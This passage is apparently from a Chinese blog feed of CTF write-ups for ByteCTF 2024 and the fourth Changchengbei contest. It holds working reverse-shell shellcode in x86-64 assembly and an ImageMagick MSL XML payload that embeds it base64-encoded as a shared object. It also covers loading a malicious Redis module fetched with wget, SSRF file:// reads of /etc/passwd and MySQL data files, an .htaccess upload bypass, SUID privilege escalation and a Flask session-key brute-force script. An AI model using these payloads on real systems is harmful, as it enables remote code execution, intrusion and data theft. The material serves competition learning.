class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">BITS</span> <span class="hljs-number">64</span><br>  org <span class="hljs-number">0x0</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">ehdr:</span>                           <span class="hljs-comment">; Elf64_Ehdr</span><br>  <span class="hljs-built_in">db</span> <span class="hljs-number">0x7f</span>, <span class="hljs-string">&quot;ELF&quot;</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>    <span class="hljs-comment">; e_ident</span><br>  <span class="hljs-built_in">times</span> <span class="hljs-number">8</span> <span class="hljs-built_in">db</span> <span class="hljs-number">0</span><br>  <span class="hljs-built_in">dw</span>  <span class="hljs-number">3</span>                         <span class="hljs-comment">; e_type : ET_DYN</span><br>  <span class="hljs-built_in">dw</span>  <span class="hljs-number">0x3e</span>                      <span class="hljs-comment">; e_machine</span><br>  <span class="hljs-built_in">dd</span>  <span class="hljs-number">1</span>                         <span class="hljs-comment">; e_version</span><br>  <span class="hljs-built_in">dq</span>  _start                    <span class="hljs-comment">; e_entry</span><br>  <span class="hljs-built_in">dq</span>  <span class="hljs-number">0x40</span>                      <span class="hljs-comment">; e_phoff</span><br>  <span class="hljs-built_in">dq</span>  <span class="hljs-number">0</span>                         <span class="hljs-comment">; e_shoff</span><br>  <span class="hljs-built_in">dd</span>  <span class="hljs-number">0</span>                         <span class="hljs-comment">; e_flags</span><br>  <span class="hljs-built_in">dw</span>  <span class="hljs-number">0x40</span>                      <span class="hljs-comment">; e_ehsize</span><br>  <span class="hljs-built_in">dw</span>  <span class="hljs-number">0x38</span>                      <span class="hljs-comment">; e_phentsize</span><br>  <span class="hljs-built_in">dw</span>  <span class="hljs-number">2</span>                         <span class="hljs-comment">; e_phnum</span><br>  <span class="hljs-built_in">dw</span>  <span class="hljs-number">0</span>                         <span class="hljs-comment">; e_shentsize ;</span><br>  <span class="hljs-built_in">dw</span>  <span class="hljs-number">0</span>                         <span class="hljs-comment">; e_shnum ;</span><br>  <span class="hljs-built_in">dw</span>  <span class="hljs-number">0</span>                         <span class="hljs-comment">; e_shstrnd ;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">phdr_loadable:</span>                  <span class="hljs-comment">; Elf64_Phdr</span><br>  <span class="hljs-built_in">dd</span>  <span class="hljs-number">1</span>                         <span class="hljs-comment">; p_type</span><br>  <span class="hljs-built_in">dd</span>  <span class="hljs-number">7</span>                         <span class="hljs-comment">; p_flags</span><br>  <span class="hljs-built_in">dq</span>  <span class="hljs-number">0</span>                         <span class="hljs-comment">; p_offset</span><br>  <span class="hljs-built_in">dq</span>  $$                        <span class="hljs-comment">; p_vaddr</span><br>  <span class="hljs-built_in">dq</span>  $$                        <span class="hljs-comment">; p_paddr</span><br>  <span class="hljs-built_in">dq</span>  loadable_size             <span class="hljs-comment">; p_filesz</span><br>  <span class="hljs-built_in">dq</span>  loadable_size             <span class="hljs-comment">; p_memsz</span><br>  <span class="hljs-built_in">dq</span>  <span class="hljs-number">0x1000</span>                    <span class="hljs-comment">; p_align</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">phdr_dynamic:</span>                   <span class="hljs-comment">; Elf64_Phdr</span><br>  <span class="hljs-built_in">dd</span>  <span class="hljs-number">2</span>                         <span class="hljs-comment">; p_type</span><br>  <span class="hljs-built_in">dd</span>  <span class="hljs-number">7</span>                         <span class="hljs-comment">; p_flags</span><br>  <span class="hljs-built_in">dq</span>  loadable_size             <span class="hljs-comment">; p_offset</span><br>  <span class="hljs-built_in">dq</span>  _dynamic                  <span class="hljs-comment">; p_vaddr</span><br>  <span class="hljs-built_in">dq</span>  _dynamic                  <span class="hljs-comment">; p_paddr</span><br>  <span class="hljs-built_in">dq</span>  dynamic_size              <span class="hljs-comment">; p_filesz</span><br>  <span class="hljs-built_in">dq</span>  dynamic_size              <span class="hljs-comment">; p_memsz</span><br>  <span class="hljs-built_in">dq</span>  <span class="hljs-number">0x8</span>                       <span class="hljs-comment">; p_align</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">_start:</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-number">41</span>           <span class="hljs-comment">; 将 socket 系统调用号压入栈</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span>                   <span class="hljs-comment">; 将系统调用号取出到 rax</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-number">2</span>              <span class="hljs-comment">; 将地址族 AF_INET (2) 压入栈</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span>                   <span class="hljs-comment">; 将地址族取出到 rdi</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-number">1</span>          <span class="hljs-comment">; 将套接字类型 SOCK_STREAM (1) 压入栈</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span>                   <span class="hljs-comment">; 将类型取出到 rsi</span><br>  <span class="hljs-keyword">cdq</span>                      <span class="hljs-comment">; 将 rdx 清零 (用于协议)</span><br>  <span class="hljs-keyword">syscall</span>                   <span class="hljs-comment">; 调用系统调用</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rax</span>            <span class="hljs-comment">; 将返回的 socket 文件描述符保存到 rbp</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x101010101010101</span>  <span class="hljs-comment">; 创建一个全 1 的值</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span>                    <span class="hljs-comment">; 将其压入栈</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x101010101010101</span> ^ -<span class="hljs-number">0x78a693d0e2f6fffe</span> <span class="hljs-comment">; 生成目标地址</span><br>  <span class="hljs-keyword">xor</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rax</span>             <span class="hljs-comment">; 设置 sockaddr 结构体的内容</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-number">42</span>           <span class="hljs-comment">; 将 connect 系统调用号压入栈</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span>                    <span class="hljs-comment">; 取出到 rax</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rbp</span>               <span class="hljs-comment">; 将 socket 文件描述符移入 rdi</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-number">0x10</span>                  <span class="hljs-comment">; socklen_t addrlen</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdx</span>                    <span class="hljs-comment">; 将长度取出到 rdx</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span>               <span class="hljs-comment">; 将 sockaddr 结构体指针移入 rsi</span><br>  <span class="hljs-keyword">syscall</span>                    <span class="hljs-comment">; 调用 connect</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rbp</span>               <span class="hljs-comment">; 将 socket 文件描述符移入 rdi</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-number">2</span>                     <span class="hljs-comment">; 需要重定向的文件描述符数量</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span>                    <span class="hljs-comment">; 将计数存入 rsi</span><br><span class="hljs-symbol">  loop_1:</span><br>      <span class="hljs-keyword">push</span> <span class="hljs-number">33</span>          <span class="hljs-comment">; 将 dup2 系统调用号压入栈</span><br>      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span>               <span class="hljs-comment">; 取出到 rax</span><br>      <span class="hljs-keyword">syscall</span>                <span class="hljs-comment">; 调用 dup2</span><br>      <span class="hljs-keyword">dec</span> <span class="hljs-built_in">rsi</span>                <span class="hljs-comment">; 递减计数</span><br>      <span class="hljs-keyword">jns</span> loop_1             <span class="hljs-comment">; 如果 rsi &gt;= 0，继续循环</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-number">0x68</span>                 <span class="hljs-comment">; 压入字符串的后半部分</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x732f2f2f6e69622f</span> <span class="hljs-comment">; 压入 &#x27;/bin/sh&#x27; 的小端格式</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span>                  <span class="hljs-comment">; 将路径压入栈</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span>              <span class="hljs-comment">; 将路径指针移入 rdi</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-number">0x1010101</span> ^ <span class="hljs-number">0x6873</span>  <span class="hljs-comment">; 创建参数数组的后半部分</span><br>  <span class="hljs-keyword">xor</span> <span class="hljs-built_in">dword</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-number">0x1010101</span> <span class="hljs-comment">; 清理 argv</span><br>  <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">esi</span>              <span class="hljs-comment">; envp = NULL</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsi</span>                  <span class="hljs-comment">; null terminate</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-number">8</span>                    <span class="hljs-comment">; argv 数组长度</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span>                   <span class="hljs-comment">; 计算 argv 的地址</span><br>  <span class="hljs-keyword">add</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span>              <span class="hljs-comment">; 将参数数组指针调整</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsi</span>                  <span class="hljs-comment">; &#x27;sh&#x27;</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span>              <span class="hljs-comment">; 将 argv 指针移入 rsi</span><br>  <span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span>              <span class="hljs-comment">; envp = NULL</span><br>  <span class="hljs-keyword">push</span> <span class="hljs-number">59</span>           <span class="hljs-comment">; 将 execve 系统调用号压入栈</span><br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span>                   <span class="hljs-comment">; 取出到 rax</span><br>  <span class="hljs-keyword">syscall</span>                   <span class="hljs-comment">; 调用 execve</span><br><br>loadable_size  <span class="hljs-built_in">equ</span>  $ - ehdr<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">_dynamic:</span><br>    <span class="hljs-built_in">dq</span> <span class="hljs-number">6FFFFEF5h</span>,_hash       <span class="hljs-comment">;DT_HASH</span><br>    <span class="hljs-built_in">dq</span> <span class="hljs-number">5</span>, <span class="hljs-number">0</span>                  <span class="hljs-comment">;DT_STRTAB</span><br>    <span class="hljs-built_in">dq</span> <span class="hljs-number">6</span>, <span class="hljs-number">0</span>                  <span class="hljs-comment">;DT_SYMTAB</span><br>    <span class="hljs-built_in">dq</span> <span class="hljs-number">0Ah</span>, <span class="hljs-number">0</span>                <span class="hljs-comment">;DT_STRSZ</span><br>    <span class="hljs-built_in">dq</span> <span class="hljs-number">0Bh</span>, <span class="hljs-number">0</span>                <span class="hljs-comment">;DT_SYMENT</span><br>    <span class="hljs-built_in">dq</span> <span class="hljs-number">0Ch</span>, _start           <span class="hljs-comment">;DT_INIT</span><br>    <span class="hljs-built_in">dq</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span>                   <span class="hljs-comment">;DT_NULL</span><br><br>dynamic_size <span class="hljs-built_in">equ</span> $ - _dynamic<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">_hash:</span><br>    <span class="hljs-built_in">dd</span> <span class="hljs-number">1</span><br>    <span class="hljs-built_in">dd</span> <span class="hljs-number">1</span><br>    <span class="hljs-built_in">dd</span> <span class="hljs-number">1</span><br>    <span class="hljs-built_in">dd</span> <span class="hljs-number">0</span><br>    <span class="hljs-built_in">dq</span> <span class="hljs-number">0</span><br>    <span class="hljs-built_in">dd</span> <span class="hljs-number">0</span><br>    <span class="hljs-built_in">dd</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>然后编译，生成123.so</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nasm</span> -f bin -o <span class="hljs-number">123</span>.so <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p>evil2.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;image&gt;<br> &lt;read filename=&quot;inline:data:text/8BIM;base64,f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAsAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAACAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJgEAAAAAAAAmAQAAAAAAAAAQAAAAAAAAAgAAAAcAAAAmAQAAAAAAACYBAAAAAAAAJgEAAAAAAABwAAAAAAAAAHAAAAAAAAAACAAAAAAAAABqKVhqAl9qAV6ZDwVIicVIuAEBAQEBAQEBUEi4AwEIHC5tWIZIMQQkaipYSInvahBaSInmDwVIie9qAl5qIVgPBUj/znn2amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F9f7/bwAAAACWAQAAAAAAAAUAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAAAAAAAAAAACgAAAAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAAAAAAAAMAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAABAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; /&gt; <br> &lt;write filename=&quot;/tmp/123.so&quot; /&gt;<br>&lt;/image&gt;<br></code></pre></td></tr></table></figure><p>经过一系列操作后，发现so文件并没有成功被加载。</p><p><a href="https://www.anquanke.com/post/id/175403%C3%82%C2%A0#h2-6">https://www.anquanke.com/post/id/175403%C3%82%C2%A0#h2-6</a></p><p>我们发现当文件是MPEG format时，程序会调用’ffmpeg’ program进行转换，而如下后缀都被认为成MPEG format</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">WMV MOV M4V M2V <span class="hljs-built_in">MP4</span> <span class="hljs-built_in">MPG</span> <span class="hljs-built_in">MPEG</span> <span class="hljs-built_in">MKV</span> <span class="hljs-built_in">AVI</span> <span class="hljs-number">3</span>G2 <span class="hljs-number">3</span>GP<br></code></pre></td></tr></table></figure><p><img src="/img/2024bytectf/image-20240921220848970.png" alt="image-20240921220848970"></p><p>意思是，在调用MPEG format文件的时候，才会调用so文件。那我们还要同时写一个MPEG format类型的文件</p><p>evil2.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;image&gt;<br> &lt;read filename=&quot;inline:data:text/8BIM;base64,f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAsAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAACAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJgEAAAAAAAAmAQAAAAAAAAAQAAAAAAAAAgAAAAcAAAAmAQAAAAAAACYBAAAAAAAAJgEAAAAAAABwAAAAAAAAAHAAAAAAAAAACAAAAAAAAABqKVhqAl9qAV6ZDwVIicVIuAEBAQEBAQEBUEi4AwEIHC5tWIZIMQQkaipYSInvahBaSInmDwVIie9qAl5qIVgPBUj/znn2amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F9f7/bwAAAACWAQAAAAAAAAUAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAAAAAAAAAAACgAAAAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAAAAAAAAMAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAABAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; /&gt; <br> &lt;write filename=&quot;/tmp/123.so&quot; /&gt;<br> &lt;write filename=&quot;/tmp/123.wmv&quot; /&gt;<br>&lt;/image&gt;<br></code></pre></td></tr></table></figure><p>这样会在&#x2F;tmp里同时生成一个123.wmv，而且要在加载so的时候同时加载123.wmv</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">?<span class="hljs-attr">so</span><span class="hljs-operator">=</span><span class="hljs-number">123</span><span class="hljs-variable">&amp;key</span>=HelloByteCTF2024<span class="hljs-variable">&amp;byte</span>=Imagick<span class="hljs-variable">&amp;ctf</span>[]=<span class="hljs-keyword">/tmp/</span><span class="hljs-number">123.</span>wmv<br></code></pre></td></tr></table></figure><p>我们在服务器上起监听，就能弹到shell了。</p><p><img src="/img/2024bytectf/image-20240921221212138.png" alt="image-20240921221212138"></p><p>然后到处都找不到flag，查看启动的进程，发现存在redis</p><p><img src="/img/2024bytectf/image-20240921221300995.png" alt="image-20240921221300995"></p><p>同时在&#x2F;etc&#x2F;redis-6.0.8&#x2F;redis.conf里找到了链接redis的密码<code>bytectfa0d90b</code></p><p><img src="/img/2024bytectf/image-20240921221448775.png" alt="image-20240921221448775"></p><p>有了redis密码之后经过尝试，可以进行主从复制提权。</p><p>利用<a href="https://github.com/0671/RabR/blob/main/exp/linux/exp.so%E8%BF%99%E4%B8%AA%E6%81%B6%E6%84%8Fso%E6%96%87%E4%BB%B6%E3%80%82">https://github.com/0671/RabR/blob/main/exp/linux/exp.so这个恶意so文件。</a></p><p>先把这个下载上传到vps上，然后再shell里利用wget下载到&#x2F;tmp目录下</p><p><img src="/img/2024bytectf/image-20240921221847625.png" alt="image-20240921221847625"></p><p>记得利用chmod 777 exp.so 命令给予他可执行权限。</p><p>链接redis：redis-cli -h 127.0.0.1 -a bytectfa0d90b</p><p>加载恶意so文件：module load &#x2F;tmp&#x2F;exp.so</p><p>rce ：system.exec “id”</p><p>在root目录下找到了flag</p><p><img src="/img/2024bytectf/image-20240921222049205.png" alt="image-20240921222049205"></p><blockquote><p>ByteCTF{42865f30bdd60920bff32aff81bfeeb4}</p></blockquote><h1 id="OnlyBypassMe"><a href="#OnlyBypassMe" class="headerlink" title="OnlyBypassMe"></a>OnlyBypassMe</h1><p>开局一个报错页面，是Spring Boot的报错页面，直接拿工具扫！</p><p><img src="/img/2024bytectf/image-20240921222552652.png" alt="image-20240921222552652"></p><p><img src="/img/2024bytectf/image-20240921222711981.png" alt="image-20240921222711981"></p><p>扫到了&#x2F;swagger-ui.html，这是网站的api</p><p>先注册一个用户</p><p><img src="/img/2024bytectf/image-20240921222933693.png" alt="image-20240921222933693"></p><p>然后去登录</p><p><img src="/img/2024bytectf/image-20240921223018429.png" alt="image-20240921223018429"></p><p>注意到有一个被删除的路由，这里可能有漏洞，这里更新的头像是url的，尝试发现可以利用file伪协议读文件。</p><p><img src="/img/2024bytectf/image-20240921223112810.png" alt="image-20240921223112810"></p><p>直接传<code>&#123;&quot;url&quot;:&quot;file:///etc/passwd&quot;&#125;</code>行不通，提示</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;code&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-number">500</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;message&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;文件格式错误,仅支持jpg/png/gif/jpeg类型文件&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;data&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;timestamp&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2024-09-21 14:32:45&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;error&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;文件格式错误,仅支持jpg/png/gif/jpeg类型文件&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;status&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;nums&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;requestId&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2024092114324500016&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>可以用#截断后面的后缀<code>&#123;&quot;url&quot;:&quot;file:///etc/passwd#.png&quot;&#125;</code></p><p>然后进去&#x2F;api&#x2F;v1&#x2F;users&#x2F;getUserAvatar就能读到想要的文件。</p><p><img src="/img/2024bytectf/image-20240921223554128.png" alt="image-20240921223554128"></p><p>但是flag没有在根目录，通过读取&#x2F;etc&#x2F;passwd发现有mysql服务。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:MySQL</span> <span class="hljs-title class_">Server</span>,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/liuguang212/article/details/115693542">Linux下MySQL的数据文件存放位置</a></p><p>linux mysql默认数据库目录：&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;</p><p><a href="https://blog.csdn.net/zgscwxd/article/details/139107595">MySQL数据库文件的存放路径及目录</a></p><p>最后在&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;byteCTF&#x2F;flag.ibd里找到了flag</p><p><code>&#123;&quot;url&quot;:&quot;file:///var/lib/mysql/byteCTF/flag.ibd#.png&quot;&#125;</code></p><p><img src="/img/2024bytectf/image-20240921223816163.png" alt="image-20240921223816163"></p><p>获取到的内容解密后得到flag</p><blockquote><p>ByteCTF{b0b563351887fdb76459eee6ce17472f}</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第四届长城杯web全题解</title>
    <link href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/"/>
    <url>/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="A3aqd">WEB</h1><h2 id="KFXcl">SQLUS</h2><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/1.png"></p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/2.png"></p><p>猜测账户是admin密码是任意一个字符</p><p>登录进去后头像那边，可以上传文件，但是文件名里不能有p，尝试传入.htaccess然后传入一个txt当做php执行。</p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/3.png"></p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/4.png"></p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/5.png"></p><p>在头像前端看到了上传路径<img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/6.png"></p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/7.png"></p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/8.png"></p><p>flag没有权限读，需要提权，反弹shell失败，尝试suid提权。</p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/9.png"></p><p>发现tac有suid权限，直接读文件</p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/10.png"></p><h2 id="Y9YdF">CandyShop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\Users\13664\Desktop\　\工作学习\web\密码字典\admin_week_password.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        data = f.readline().strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">7</span>:<br>            a = <span class="hljs-string">f&#x27;&#x27;&#x27; python C:\\Users\\13664\\Desktop\\　\\工作学习\\web\\flask-session-cookie-manager-master\\flask_session_cookie_manager3.py decode -c &quot;.eJwNy00KgCAQQOG7zLqFKaJ2mZjRmZDIwJ9FRHfPt_zgvRBblb3fJxfYgMRoq5wl5dakmBQFCpYCktdR9MxEH0VggZy49NyfeR2DW580GteCF09CRPh-SYsdHg.Zt0G0g.eNn2Bft2QUvmXTbcXpozaEjLyUk&quot; -s &quot;<span class="hljs-subst">&#123;data&#125;</span>&quot;&#x27;&#x27;&#x27;</span><br>            <span class="hljs-built_in">print</span>(data)<br>            os.system(a)<br></code></pre></td></tr></table></figure><p>密钥爆破出来是a123456</p><p><img src="/img/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/11.png"></p><p>利用flask_session_cookie_manager3.py工具伪造出admin的cookie：</p><figure class="highlight stylus"><table><tr><td 